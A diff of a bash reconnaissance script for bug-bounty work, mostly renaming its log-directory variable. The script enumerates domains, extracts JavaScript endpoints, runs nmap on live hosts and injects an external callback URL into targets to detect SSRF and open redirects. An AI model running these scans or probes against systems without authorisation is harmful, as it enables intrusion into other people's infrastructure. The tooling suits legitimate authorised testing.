@@ -196,7 +196,7 @@ check "Creating directories"
 
 printf '%-10s %-67s %10s\n' " " "!############################################################!" " " | lolcat
 printf '%-15s %-8s %-35s %8s %15s\n' " " "######" "Target is $domain" "######" " " | lolcat | tee -a $LOGFILE
-printf '%-15s %-8s %-35s %8s %15s\n' " " "######" "Logdir is" "######" " " | lolcat | tee -a $LOGFILE
+printf '%-15s %-8s %-35s %8s %15s\n' " " "######" "Savedir is" "######" " " | lolcat | tee -a $LOGFILE
 printf '%-15s %-8s %-35s %8s %15s\n' " " "######" "$PRETTY" "######" " " | lolcat | tee -a $LOGFILE
 printf '%-15s %-8s %-35s %8s %15s\n' " " "######" "DEBUG is set to $DEBUGPRINT" "######" " " | lolcat | tee -a $LOGFILE
 printf '%-10s %-67s %10s\n' " " "!############################################################!" " " | lolcat
@@ -264,7 +264,7 @@ sort -u "$SAVEDIR/domains.txt" -o "$SAVEDIR/domains.txt"
 
 #Removing out of scope domains
 print "Removing out of scope domains"
-python3 "$TOOLDIR/RR/support/scope/out_of_scope.py" "$domain" "$SAVEDIR/domains.txt" > "$LOGDIR/out_of_scope.txt"
+python3 "$TOOLDIR/RR/support/scope/out_of_scope.py" "$domain" "$SAVEDIR/domains.txt" > "$LOGS/out_of_scope.txt"
 res=$?
 check "Remove out of scope domains"
 # No data exists or was written for new domains, so skip overwriting!
@@ -394,7 +394,7 @@ check "Create dir for extracted endpoints"
 EXTRACTOR="$TOOLDIR/relative-url-extractor/extract.rb"
 # getURL                                         #Basepath   #Folder    #script   #outputpath #logdir
 for entry in $(cat "$TMPDIR/files2.txt" | sort | uniq ); do
-    $TOOLDIR/RR/support/getURL.sh $SCRIPT_DATA $entry $EXTRACTOR $JS_ENDPOINTS/$entry $LOGDIR &
+    $TOOLDIR/RR/support/getURL.sh $SCRIPT_DATA $entry $EXTRACTOR $JS_ENDPOINTS/$entry $LOGS &
 done
 #COMMAND="$TOOLDIR/RR/support/getURL.sh $SCRIPT_DATA _target_ $EXTRACTOR $JS_ENDPOINTS/_target_ $TMPDIR"
 #interlace --silent -tL $SAVEDIR/tmp/files2.txt -threads $INTERTHREADS -c "$COMMAND"
@@ -418,7 +418,7 @@ run=0
 # getJS                                        #domain     #Tool    #Organization     #Output folder #logdir
 for entry in $(cat "$SAVEDIR/alive.txt" | sort | uniq ); do
     ((run++))
-    $TOOLDIR/RR/support/getJS.sh $entry $TOOLDIR/jsearch/jsearch.py $organitzationName $JSEARCH_DIR $LOGDIR &
+    $TOOLDIR/RR/support/getJS.sh $entry $TOOLDIR/jsearch/jsearch.py $organitzationName $JSEARCH_DIR $LOGS &
     if [ $run -gt 10 ]; then
         print "Hit 10 concurrent scans - waiting to not run out of memory"
         run=0
@@ -475,7 +475,7 @@ echo -e ""
 echo -e "${BOLD}${GREEN}[+]STEP 5: Starting NMAP Scan for alive domains" | tee -a $LOGFILE
 NMAP_DIR="$SAVEDIR/nmap"
 mkdir -p "$NMAP_DIR"
-mkdir -p "$LOGDIR/NMAP"
+mkdir -p "$LOGS/NMAP"
 
 # nmap all hosts
 # Need to make nmap less intrusive on all hosts?
@@ -486,7 +486,7 @@ for entry in $(cat "$SAVEDIR/recon-$todate/mass.txt" | sort | uniq ); do
     domain=${domaindot::-1}
     ip=$(echo $entry | awk -F "" '{print $3}')
     ((run++))
-    $TOOLDIR/RR/support/nmapHost.sh "$domain" "$NMAP_DIR" "$TMPDIR" "$LOGDIR/NMAP" "$ip" &
+    $TOOLDIR/RR/support/nmapHost.sh "$domain" "$NMAP_DIR" "$TMPDIR" "$LOGS/NMAP" "$ip" &
     check "NMAP as background task"
     if [ $run -gt 10 ]
     then
@@ -557,11 +557,11 @@ cat "$SAVEDIR/domains.txt" >> "$TMPDIR/all_domains.txt"
 cat "$SAVEDIR/recon-$todate/alldomains.txt" >> "$TMPDIR/all_domains.txt"
 cat "$TMPDIR/all_domains.txt" | sort | uniq >> "$SAVEDIR/all_domains.txt"
 mkdir -p $SAVEDIR/ssrf
-mkdir -p "$LOGDIR/ssrf"
+mkdir -p "$LOGS/ssrf"
 
 # check using script from Twitter
 for entry in $(cat "$SAVEDIR/all_domains.txt"); do
-    bash -c "BASH_ENV=/root/Bug_Bounty/tools/SSRFire/.profile $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/pqCLV?$entry" "$SAVEDIR/ssrf" $TMPDIR" "$LOGDIR/ssrf"
+    $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/pqCLV?$entry" "$SAVEDIR/ssrf" $TMPDIR" "$LOGS/ssrf"
     check "SSRF / OR identifier for $entry"
 done
 
@@ -570,8 +570,8 @@ done
 print "SSRFire"
 mkdir -p $SAVEDIR/ssrf/ssrfire
 # SSRFire will automatically add test url to callback
-# Simple requests using cleaned lists!
-$TOOLDIR/SSRFire/ssrfire.sh -d "$domain" -s "http://ssrf.h4x.fun/x/pqCLV" >> "$SAVEDIR/ssrf/ssrfire/log.txt"
+# Simple requests using cleaned lists! 
+bash -c "BASH_ENV=/root/Bug_Bounty/tools/SSRFire/.profile $TOOLDIR/SSRFire/ssrfire.sh -d $domain -s http://ssrf.h4x.fun/x/pqCLV" >> "$SAVEDIR/ssrf/ssrfire/log.txt"
 check "SSRFire"
 cp -r $TOOLDIR/SSRFire/output/$domain/* $SAVEDIR/ssrf/ssrfire
 check "Copy results ssrfire"
